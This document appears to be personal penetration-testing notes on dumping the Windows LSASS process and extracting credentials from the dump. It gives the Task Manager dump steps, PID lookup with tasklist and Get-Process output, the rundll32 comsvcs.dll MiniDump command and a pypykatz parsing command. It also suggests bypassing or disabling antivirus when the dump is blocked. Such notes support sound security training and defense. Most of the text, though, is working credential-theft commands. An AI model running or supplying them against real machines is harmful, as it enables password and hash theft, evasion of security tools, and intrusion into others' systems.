[Local Security Authority Subsystem Service (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)

---
## dumping LSASS process memory

-- **task manager method:** --
if we have graphical interaction within a windows host:
- Open `Task Manager`
- Select the `Processes` tab
- Find and right click the `Local Security Authority Process`
- Select `Create dump file`

a file called `lsass.DMP` is created and saved in `%temp%`

--  **Rundll32.exe & Comsvcs.dll method** --
first we must determine what process ID (`PID`) is assigned to `lsass.exe`
cmd:
```
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

powershell:
```
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

creating a dump file using powershell:
```
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
Recall that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing
 
---

## extracting credentials from .dmp file

[pypykatz](https://github.com/skelsec/pypykatz)
```
pypykatz lsa minidump /path_to_file/lsass.dmp
```
